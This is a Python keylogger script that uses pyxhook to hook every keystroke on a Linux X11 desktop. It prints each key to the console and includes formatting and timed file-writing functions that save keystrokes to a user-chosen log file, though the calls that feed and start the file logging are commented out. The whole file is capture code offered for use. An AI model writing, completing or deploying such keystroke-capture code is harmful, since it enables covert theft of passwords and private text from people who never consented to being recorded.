"""
pyxhook is the module that will give us access to the controler of the
key pressing
Credit to: https://github.com/JeffHoogland/pyxhook7

"""
import pyxhook
import time
import optparse
import threading

log_file = ""
running = False
tempBuffer = []


def rare(char):
    return " [" + char + "]\n"

def formatChar(char):
    res = ""
    reasonableChars = ["!", "\"", "'", "@", "#", "$", "%", "&", "/", "(",\
                       ")", "?", "¿", "¡", "^", "*", ",", ".", ":", "_", \
                       "-", ";", "{", "}", "'", "+", "[", "]", "<", ">"]
    rares = ["Alt_L", "Tab", "Control_L", "Shift_L", "Caps_Lock", \
             "masculine", "Control_R", "Menu", "Home", "End", "Page_Up", \
             "Next", "Pause", "Delete", "Insert", "Num_Lock", "F1", "F2",\
             "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "F11",\
             "F12", "Super_L", "Shift_R"]
    if char.isalnum():
        res = char
    elif char in reasonableChars:
        res = char
    elif char == "space":
        res = " "
    elif char == "Return":
        res = "\n"
    elif char in rares:
        res = rare(char)

    return res

def logBuffer():
    global log_file
    global tempBuffer
    ourBuffer = tempBuffer
    tempBuffer = []
    threading.Timer(2.0, logBuffer).start()
    with open(log_file, 'a') as f:
        for i in ourBuffer:
            f.write(formatChar(i))




def pressEvent(event):
    global running
    global log_file
    global tempBuffer
    #tempBuffer.append(event.Key)
    if event.Key == "Tab":
        print("Pressed TAB!")
    else:
        print("Pressed: [" + event.Key + "]")
    
    
    # ESC to stop
    if event.Ascii == 27:
        print("Turning off!")
        running = False

def main():

    global running
    global log_file

    parser = optparse.OptionParser("Usage %prog -f <log file path>")
    parser.add_option('-f', dest='logfile', type='string', help='specify log file path')

    (options, args) = parser.parse_args()

    if options.logfile == None:
        print(parser.usage)
        exit(1)

    log_file = options.logfile
    # Create hook object
    hook = pyxhook.HookManager()
    # Listen to every key press and tell the object to use the function
    # pressEvent() to handle what to do everytime a keystroke is detected
    hook.KeyDown = pressEvent
    # Hook keyboard
    hook.HookKeyboard()
    # Start the hook
    hook.start()

    #logBuffer()
    running = True
    while running:
        time.sleep(0.1)
    hook.cancel()
    exit(0)

if __name__ == '__main__':
    main()
